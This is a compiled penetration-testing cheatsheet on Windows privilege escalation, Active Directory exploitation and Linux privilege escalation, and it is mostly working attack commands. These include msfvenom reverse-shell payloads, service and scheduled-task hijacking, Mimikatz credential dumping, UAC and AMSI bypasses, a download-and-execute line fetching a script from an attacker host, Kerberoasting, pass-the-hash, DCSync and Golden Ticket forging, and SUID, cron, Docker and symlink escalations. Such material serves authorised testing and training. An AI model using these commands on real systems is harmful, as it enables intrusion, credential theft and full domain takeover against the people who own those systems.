# Cybersecurity Guides & Cheatsheets Compilation

This document contains a full compilation of the guides and cheatsheets for Windows Privilege Escalation, Active Directory Exploitation, and Linux Privilege Escalation.

---

## **Table of Contents**

1.  [Windows Privilege Escalation](#windows-privilege-escalation)
    * [Full Guide](#windows-privilege-escalation-full-guide)
    * [Comprehensive Cheatsheet](#windows-privilege-escalation-comprehensive-cheatsheet)
    * [11 Exploits Cheatsheet (with Exploitation Commands)](#11-exploits-cheatsheet)
2.  [Active Directory Exploitation](#active-directory-exploitation)
    * [Full Guide](#active-directory-exploitation-full-guide)
    * [Commands Cheatsheet](#active-directory-commands-cheatsheet)
3.  [Linux Privilege Escalation](#linux-privilege-escalation)
    * [Ultimate Guide (All Parts Combined)](#linux-privilege-escalation-ultimate-guide)

---
---

## <a name="windows-privilege-escalation"></a>1. Windows Privilege Escalation

This section covers the techniques for elevating privileges on a local Windows machine.

### <a name="windows-privilege-escalation-full-guide"></a>Windows Privilege Escalation Full Guide

This guide is for educational and ethical purposes only. **Never** perform these actions on systems you do not have explicit, written permission to test.

#### **A Note on Methodology**

Privilege escalation isn't about running one magic command. It's a **methodical process** of information gathering (**enumeration**) followed by identifying and exploiting a weakness. Automated scripts like **WinPEAS** and **PowerUp** are excellent for quickly finding low-hanging fruit, but understanding the underlying manual checks is crucial.

The general process is:
1.  **Enumerate:** Gather as much information as possible about the system (OS version, patch level, users, services, running processes, network configuration, etc.).
2.  **Analyze:** Sift through the enumerated data to find potential misconfigurations or vulnerabilities.
3.  **Exploit:** Use a known technique to leverage the weakness and gain higher privileges.

---

#### **Enumeration / Basic Commands**

This is the most critical phase. You need to understand the system you're on.

* **Who am I?:** Find out your current user and privileges.
    ```powershell
    whoami /all
    ```
* **System Information:** Get OS version and architecture. This is key for finding kernel exploits.
    ```powershell
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
    ```
* **Running Processes & Services:** See what's running and under which user account.
    ```powershell
    tasklist /SVC
    net start
    ```
* **Network Configuration:** See network interfaces and listening ports.
    ```powershell
    ipconfig /all
    netstat -ano
    ```

---

#### **Weak Service Permissions**

A service is a program that runs in the background, often as the powerful `NT AUTHORITY\SYSTEM` user. If a low-privilege user can modify or restart a high-privilege service, they can hijack it.

* **Commands & Tools:**
    ```powershell
    # Check permissions with AccessChk
    accesschk.exe /accepteula -uwcqv "Users" *
    ```
* **Exploitation:**
    ```powershell
    # Reconfigure the service's executable path
    sc config VulnSvc binPath= "C:\tmp\reverse_shell.exe"
    # Restart the service
    sc stop VulnSvc
    sc start VulnSvc
    ```

---

#### **Unquoted Service Paths**

If a service path with spaces is not enclosed in quotes, Windows will try to execute paths sequentially. An attacker can place a malicious executable in a higher-level directory to be executed first.

* **Commands & Tools:**
    ```powershell
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
    ```
* **Exploitation:** Identify the vulnerable path: `C:\Program Files\Vulnerable App\vuln.exe`. If you have write permissions in `C:\Program Files\`, place a malicious executable named `Vulnerable.exe` in `C:\Program Files\`. Restart the service.

---

#### **SeImpersonate / SeAssignPrimaryToken Privilege Escalation**

These powerful user privileges can often be abused to impersonate the `SYSTEM` user and execute code.

* **Exploitation (with PrintSpoofer):**
    ```powershell
    # Verify you have the privilege
    whoami /priv
    # Launch a command prompt as SYSTEM
    PrintSpoofer.exe -i -c "cmd.exe"
    ```

---

#### **DLL Hijacking**

This occurs when an application tries to load a DLL without specifying its full path.

* **Tools:** Use **ProcMon (Process Monitor)**. Filter for `NAME NOT FOUND` results for operations on files ending in `.dll`.
* **Exploitation:** Craft a malicious DLL with the same name as the missing one. Place your malicious DLL in the writable location. Restart the application.

---

#### **Sensitive Files & Hashes (SAM/LSA Secrets)**

If you gain administrative access, you can dump password hashes from the **SAM** file and other secrets from **LSA** memory.

* **Commands & Tools (Mimikatz):**
    ```powershell
    # Must be run from a high-privilege prompt
    privilege::debug
    lsadump::sam
    ```
* **Manual Registry Save:**
    ```powershell
    reg save hklm\sam C:\tmp\sam.save
    reg save hklm\system C:\tmp\system.save
    ```

---

#### **Windows Vault / Credential Manager**

The Windows Credential Manager stores saved credentials for network shares, RDP sessions, and websites.

* **Commands & Tools:**
    ```powershell
    cmdkey /list
    vaultcmd /list
    ```

---

#### **Scheduled Tasks**

If a scheduled task runs with high privileges and executes a file you can modify, you can escalate.

* **Commands & Tools:**
    ```powershell
    # List tasks and their configurations
    schtasks /query /fo LIST /v
    # Check permissions on the file
    icacls C:\Path\To\script.bat
    ```
* **Exploitation:** Overwrite the script with malicious commands and wait for the task to run.

---

#### **AlwaysInstallElevated**

A pair of registry keys that, when set, cause any `.msi` package to be installed with SYSTEM privileges.

* **Commands & Tools:**
    ```powershell
    # Check if both keys are set to 0x1
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
* **Exploitation:**
    ```powershell
    # Create a malicious MSI with msfvenom
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f msi -o malicious.msi
    # Install it on the target
    msiexec /quiet /qn /i C:\tmp\malicious.msi
    ```

---

#### **UAC Bypass**

Abusing legitimate Windows processes that are "auto-elevated" to execute malicious code without triggering a UAC prompt.

* **Tools:** The **UACME** project on GitHub is a massive collection of UAC bypass techniques.

---

#### **AMSI Bypass**

A **critical enabler**, not a privilege escalation technique. It's a method of disabling AMSI within a process so that malicious PowerShell commands can be run.

* **Example Bypass:**
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    ```

***

### <a name="windows-privilege-escalation-comprehensive-cheatsheet"></a>Windows Privilege Escalation Comprehensive Cheatsheet

This cheatsheet provides a quick reference for common tools and commands used to identify and exploit privilege escalation vulnerabilities on Windows systems.

#### **1. Initial Enumeration & Situational Awareness**

**Always start here.**

* **Manual Enumeration Commands:**
    ```powershell
    whoami /all
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    tasklist /V
    sc query
    netstat -ano
    ```
* **Automated Enumeration Scripts:**
    ```powershell
    # WinPEAS
    .\winPEASx64.exe -quiet -outputfile report.txt
    # PowerUp.ps1
    powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
    ```

---

#### **2. Service Misconfigurations**

* **Unquoted Service Paths:**
    ```powershell
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
    ```
* **Weak Service Permissions:**
    ```powershell
    # Check permissions
    accesschk.exe /accepteula -uwcqv Users *
    # Reconfigure and restart
    sc config <service_name> binPath= "C:\tmp\payload.exe"
    sc start <service_name>
    ```

---

#### **3. Credential & Token Abuse**

* **Impersonation Privileges (SeImpersonate):**
    ```powershell
    # Check privilege
    whoami /priv
    # Exploit with PrintSpoofer
    PrintSpoofer.exe -i -c cmd.exe
    ```
* **Stored Credentials & Secrets:**
    ```powershell
    cmdkey /list
    # Dump from memory with Mimikatz (requires Admin)
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
    ```

---

#### **4. Registry Misconfigurations**

* **AlwaysInstallElevated:**
    ```powershell
    # Check if both keys are set to 1
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    # Exploit by running a malicious MSI
    msiexec /quiet /qn /i C:\tmp\malicious.msi
    ```

---

#### **5. File & Folder Permission Issues**

* **Modifiable Scheduled Tasks:**
    ```powershell
    # List tasks
    schtasks /query /fo LIST /v
    # Check permissions on the executed file
    icacls "C:\Path\To\Task\Executable.exe"
    ```

---

#### **6. Kernel Exploits**

**Last resort**, as they can be unstable.

* **Windows Exploit Suggester:**
    ```bash
    # On target, get system info
    systeminfo > systeminfo.txt
    # On attacker machine, run the tool
    python2 windows-exploit-suggester.py --database <date>-mssb.xls --systeminfo systeminfo.txt
    ```
***

### <a name="11-exploits-cheatsheet"></a>11 Exploits Cheatsheet (with Exploitation Commands)

This cheatsheet provides the specific "Find" and "Exploit" commands for the 11 Windows privilege escalation techniques.

#### **1. Enumeration / Basic Commands**
The "exploit" is the act of gathering the data.
* **Exploit Commands:**
    ```powershell
    rem -- Check user, groups, and privileges
    whoami /all
    rem -- Get OS and patch info for kernel exploits
    systeminfo
    rem -- Find interesting running services
    tasklist /SVC
    rem -- Automatically find low-hanging fruit
    .\winPEASx64.exe -quiet
    ```

---

#### **2. Weak Service Permissions**
Hijack a service your user has permission to modify.
* **Find:**
    ```powershell
    accesschk.exe /accepteula -uwcqv "Users" *
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Reconfigure the service's binary to your payload
    sc config <VulnSvc> binPath= "C:\tmp\payload.exe"
    rem -- Restart the service to execute the payload as SYSTEM
    sc stop <VulnSvc>
    sc start <VulnSvc>
    ```

---

#### **3. Unquoted Service Paths**
Exploit a service path with spaces that is not enclosed in quotes.
* **Find:**
    ```powershell
    wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious executable named after the first part of the path
    rem -- e.g., for "C:\Program Files\App\vuln.exe", name it "Program.exe"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o Program.exe
    rem -- Place the payload in the higher-level path and restart the service
    copy Program.exe "C:\"
    sc stop <VulnSvc>
    sc start <VulnSvc>
    ```

---

#### **4. SeImpersonate Privilege Escalation**
Abuse token impersonation privileges to become **SYSTEM**.
* **Find:**
    ```powershell
    whoami /priv
    ```
* **Exploit Command:**
    ```powershell
    rem -- Use a tool like PrintSpoofer to get a SYSTEM shell
    PrintSpoofer.exe -i -c "cmd.exe"
    ```

---

#### **5. DLL Hijacking**
Load a malicious DLL into a privileged application.
* **Find:** Use **ProcMon.exe** to find `NAME NOT FOUND` errors for `.dll` files.
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious DLL with the same name as the missing one
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f dll -o vulnerable.dll
    rem -- Place it in the writable directory and restart the application
    copy vulnerable.dll "C:\Path\To\Writable\Folder\"
    ```

---

#### **6. Sensitive Files & Hashes (SAM/LSA Secrets)**
Extract credentials from files or memory. **(Usually requires Admin)**.
* **Find:**
    ```powershell
    rem -- Search for passwords in common config files
    dir /s /b *unattended*.xml *web.config* *pass*.txt
    ```
* **Exploit Commands (Requires Admin):**
    ```powershell
    rem -- Dump hashes from LSA memory with Mimikatz
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
    rem -- Dump SAM and SYSTEM hives for offline cracking
    reg save hklm\sam C:\tmp\sam.save
    reg save hklm\system C:\tmp\system.save
    ```

---

#### **7. Windows Vault / Credential Manager**
Retrieve credentials saved by users.
* **Exploit Commands:**
    ```powershell
    rem -- List all credentials stored in the vault
    cmdkey /list
    rem -- Dump vault credentials with Mimikatz
    mimikatz.exe "vault::cred" exit
    ```

---

#### **8. Scheduled Tasks**
Hijack a privileged task that points to a writable file.
* **Find:**
    ```powershell
    rem -- List tasks and then check permissions on the target binary
    schtasks /query /fo LIST /v
    icacls "C:\Path\To\TaskBinary.exe"
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Overwrite the writable binary with your payload
    rem -- The original binary will be replaced. The task will run your payload on its next trigger.
    copy /Y C:\tmp\payload.exe "C:\Path\To\TaskBinary.exe"
    ```

---

#### **9. AlwaysInstallElevated**
Install an MSI package with **SYSTEM** privileges.
* **Find:**
    ```powershell
    rem -- Check if both registry keys are set to 1
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
* **Exploit Commands:**
    ```powershell
    rem -- Create a malicious MSI installer
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o payload.msi
    rem -- Run the installer on the target machine with no admin rights needed
    msiexec /quiet /qn /i C:\tmp\payload.msi
    ```

---

#### **10. UAC Bypass**
Elevate from a medium-integrity shell to a high-integrity shell.
* **Find:** Check UAC settings and the Windows build number.
* **Exploit Command (Example using fodhelper):**
    ```powershell
    rem -- Hijack the registry key that fodhelper.exe reads from
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\tmp\payload.exe" /f
    rem -- Execute fodhelper.exe to trigger the payload in a high-integrity context
    fodhelper.exe
    ```

---

#### **11. AMSI Bypass**
Disable anti-malware scanning for your current PowerShell session.
* **Exploit Command:**
    ```powershell
    rem -- Run this command first in your PowerShell session
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    rem -- Now you can run enumeration scripts like PowerUp without being blocked
    IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1'); Invoke-AllChecks
    ```

---
---

## <a name="active-directory-exploitation"></a>2. Active Directory Exploitation

This section covers techniques for exploiting misconfigurations in an Active Directory environment.

### <a name="active-directory-exploitation-full-guide"></a>Active Directory Exploitation Full Guide

#### **Introduction to Active Directory Security** 🛡️
Active Directory is the backbone of most corporate networks. Compromising AD means gaining control over the entire domain. The methodology is a cycle: **Enumerate -> Find a Foothold -> Identify Attack Paths -> Execute & Escalate -> Achieve Domain Dominance -> Persist**.

---

#### **1. Enumeration: The Foundation of Every Attack**
You cannot attack what you do not know. Once you have a foothold as any domain user, your goal is to map out AD.
* **Core Tools:** PowerView, BloodHound (SharpHound), ADExplorer.
* **What to Look For:** Domain Information, Users & Groups, Computers, GPOs, Access Control Lists (ACLs).

---

#### **2. Common Attack Vectors & Exploitation**
* **Kerberoasting:** This attack targets service accounts. Any domain user can request a Kerberos service ticket (TGS) for any Service Principal Name (SPN). Part of this ticket is encrypted with the NTLM hash of the service account's password, which can be taken offline and cracked.
* **AS-REP Roasting:** This attack targets user accounts that have the setting "Do not require Kerberos preauthentication" enabled. This allows an attacker to request an Authentication Ticket (AS-REP) for that user without providing any credentials, and crack the user's hash offline.
* **Abusing Weak ACLs / Permissions:** This involves finding an object (a user, group, or computer) that your low-privilege user has the right to modify in a dangerous way (e.g., `GenericAll`, `GenericWrite`, `WriteDacl`). BloodHound is the best tool to visualize these attack paths.
* **DCSync:** If an account is granted `DS-Replication-Get-Changes` permissions, it can ask a Domain Controller to replicate password data, including the hash for the `krbtgt` account.
* **Active Directory Certificate Services (AD CS) Abuse:** If AD CS is misconfigured, it can be abused to request certificates that allow you to authenticate as other users, including Domain Admins.

---

#### **3. Domain Dominance & Persistence** 👑
* **Golden Ticket Attack:** The ultimate persistence technique. It uses the NTLM hash of the **`krbtgt` account** to forge Kerberos Ticket-Granting Tickets (TGTs). This allows an attacker to impersonate *any* user in the domain at *any* time.
* **AdminSDHolder:** A persistence mechanism where an attacker modifies the ACL of the `AdminSDHolder` container, adding their backdoor account. A process called SDProp will then automatically apply these permissions to all protected groups (like Domain Admins).

***

### <a name="active-directory-commands-cheatsheet"></a>Active Directory Commands Cheatsheet

#### **1. Enumeration & Situational Awareness**
* **PowerView:**
    ```powershell
    Get-NetDomain
    Get-NetGroupMember -GroupName "Domain Admins"
    Get-NetUser -SPN
    ```
* **BloodHound / SharpHound:**
    ```powershell
    # Collect all data and create a ZIP file
    SharpHound.exe --collectionmethod All --zipfilename loot.zip
    ```

---

#### **2. Credential Attacks & Hash Grabbing**
* **Responder (LLMNR/NBT-NS Poisoning):**
    ```bash
    sudo responder -I eth0 -v
    ```
* **Rubeus (Kerberoasting & AS-REP Roasting):**
    ```powershell
    # Kerberoast
    Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
    # AS-REP Roast
    Rubeus.exe asreproast /outfile:asrep_hashes.txt
    ```

---

#### **3. Exploitation, Lateral Movement & Privilege Escalation**
* **Mimikatz (Credential Dumping):**
    ```powershell
    # Requires local admin privileges
    privilege::debug
    sekurlsa::logonpasswords
    ```
* **Impacket Suite:**
    ```bash
    # Pass-the-Hash with psexec
    impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes <LM_HASH>:<NT_HASH>
    # Dump all hashes with secretsdump
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
    # Kerberoast with GetUserSPNs
    impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>
    ```
* **Certipy (AD CS Abuse):**
    ```bash
    # Find vulnerable certificate templates
    certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
    ```

---

#### **4. Domain Dominance & Persistence**
* **Mimikatz (DCSync & Golden Tickets):**
    ```powershell
    # Perform a DCSync attack to get the krbtgt hash
    lsadump::dcsync /domain:corp.local /user:krbtgt
    # Forge a Golden Ticket to impersonate the Administrator
    kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
    ```
---
---

## <a name="linux-privilege-escalation"></a>3. Linux Privilege Escalation

This section covers techniques for elevating privileges on a Linux system.

### <a name="linux-privilege-escalation-ultimate-guide"></a>Linux Privilege Escalation Ultimate Guide (All Parts Combined)

This guide provides a comprehensive methodology for Linux privilege escalation, covering a wide range of basic, advanced, and niche techniques.

#### **1. Advanced Enumeration & Situational Awareness**

Advanced exploitation requires advanced enumeration.

* **Core System & User Info:**
    ```bash
    id
    whoami
    sudo -l
    uname -a
    cat /etc/os-release
    ps aux
    netstat -tulpn
    ```
* **Live Process Monitoring with pspy:**
    ```bash
    ./pspy64 -pf -i 1000
    ```
* **Deep Filesystem & Credential Analysis:**
    ```bash
    # Find all shell history files and search for keywords
    find / -name ".*_history" -ls 2>/dev/null | xargs -I {} cat {} | grep -E "(sudo|su|passwd)"
    # Look for KeePass password databases
    find / -name "*.kdbx" -ls 2>/dev/null
    ```

---

#### **2. Sudo & SUID/SGID Deep Dives**
* **Sudo Misconfigurations & GTFOBins:**
    * **Find:** `sudo -l`
    * **Exploit:** Go to **GTFOBins** (https://gtfobins.github.io/). Search for the binary listed in the `sudo -l` output and use the provided command.
        ```bash
        # If 'sudo -l' allows running 'less':
        sudo less /etc/profile
        # Then inside less, type: !/bin/sh
        ```
* **SUID / SGID Binaries:**
    * **Find:** `find / -perm -u=s -type f 2>/dev/null`
    * **Exploit:** Check the list for unusual programs. Use **GTFOBins** to find the exploit method.
* **Advanced Sudo Abuse: LD_PRELOAD:**
    * **Find:** `sudo -l | grep "env_keep.*LD_PRELOAD"`
    * **Exploit:** Create a malicious shared library C file (`preload.c`), compile it with `gcc -fPIC -shared -o /tmp/preload.so preload.c`, then run a sudo command with `LD_PRELOAD` pointing to your library: `sudo LD_PRELOAD=/tmp/preload.so <command_from_sudo_-l>`

---

#### **3. Abusing Services & Scheduled Tasks**
* **Cron Job & File Permission Abuse:**
    * **Find:** `cat /etc/crontab` and `ls -l /path/to/cron/script.sh`
    * **Exploit:** If the script is writable, overwrite it with your payload.
        ```bash
        echo 'cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell' > /path/to/writable/script.sh
        # Wait for the job to run, then execute: /tmp/rootshell -p
        ```
* **Wildcard Injection:**
    * **Find:** Look for cron job scripts using commands like `tar *` in a writable directory.
    * **Exploit (for `tar`):** Create files named after command-line options.
        ```bash
        touch -- "--checkpoint=1"
        touch -- "--checkpoint-action=exec=/bin/sh"
        ```
* **Systemd Timers:**
    * **Find:** `systemctl list-timers --all`, then `systemctl cat <service_name>.service` to check the service file.
    * **Exploit:** If the service file (`/etc/systemd/system/name.service`) is writable, modify the `ExecStart=` line to execute your payload.

---

#### **4. Filesystem & Network-Based Vectors**
* **PATH Abuse:**
    * **Find:** `echo $PATH`. Check for writable directories listed before standard paths like `/usr/bin`.
    * **Exploit:** Create a malicious script (e.g., `/tmp/ls`) with your payload. If a root script calls `ls` without a full path, it will execute your malicious version.
* **Mounted Drives & NFS `no_root_squash`:**
    * **Find:** `cat /etc/exports | grep no_root_squash`
    * **Exploit:** As `root` on an attacker machine, mount the share, copy a compiled SUID payload to it, then execute the payload from the target machine.
* **Race Conditions & Symlink Abuse (TOCTOU):**
    * **Exploit:** Trick a privileged program into writing to or changing permissions on an arbitrary file by swapping a legitimate file with a symlink.
        ```bash
        # Terminal 1: Race to create the symlink
        while true; do ln -sf /etc/shadow /tmp/targetfile; done
        # Terminal 2: Repeatedly run the vulnerable program
        while true; do /path/to/vuln_suid_app; done
        ```

---

#### **5. Modern & Niche Vectors**
* **Capabilities:**
    * **Find:** `getcap -r / 2>/dev/null`
    * **Exploit:** If a binary has a dangerous capability like `cap_setuid+ep`, it can be abused.
        ```bash
        # If python3 has the right capability:
        /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
        ```
* **Docker Group:**
    * **Find:** `id | grep docker`
    * **Exploit:** Run a container while mounting the host's root filesystem.
        ```bash
        docker run -v /:/mnt --rm -it alpine chroot /mnt sh
        ```
* **Polkit (pkexec) Abuse:**
    * **Find:** Enumerate Polkit rules with `pkaction`. Look for actions that can be performed by your user.
    * **Exploit:** Use `pkexec` to run the allowed action with arguments that spawn a shell.
* **Escaping Restricted Shells (rbash):**
    * **Exploit:** Use programs you are allowed to run to spawn a full shell.
        ```bash
        # Use vi
        vi
        # Inside vi, type: :!/bin/sh
        # Use Python
        python -c 'import os; os.system("/bin/bash")'
        ```

---

#### **6. Binary Exploitation & Kernel Exploits**
**Use these as a last resort, as they are risky and can crash the system.**
* **Simple Buffer Overflow in an SUID Binary:**
    * **Find:** Identify custom SUID binaries and test them with long strings to see if they crash.
    * **Exploit:** Requires finding the EIP offset, crafting shellcode, and overwriting the return address to point to your shellcode.
* **Kernel Exploits:**
    * **Find:** Compare `uname -r` against public exploit databases.
    * **Exploit:** Download, compile, and run the exploit code for the specific kernel.
